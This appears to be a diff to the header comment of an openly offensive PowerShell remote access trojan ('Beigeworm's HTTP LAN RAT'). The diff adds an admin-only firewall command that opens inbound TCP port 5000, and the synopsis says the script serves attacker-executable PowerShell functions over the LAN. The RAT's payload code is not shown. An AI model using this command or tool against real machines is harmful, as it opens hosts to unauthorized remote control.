@@ -1,6 +1,9 @@
 ﻿<#
 ============================== Beigeworm's HTTP LAN RAT ===============================
 
+**MUST BE EXECUTED AS ADMIN TO OPEN PORT.**
+(New-NetFirewallRule -DisplayName "AllowWebServer" -Direction Inbound -Protocol TCP –LocalPort 5000 -Action Allow)
+
 SYNOPSIS
 This script opens port 5000 on the machine and serves a simple webpage with powershell fuctions that can be executed.
 Attacker device must be on the same local area network.
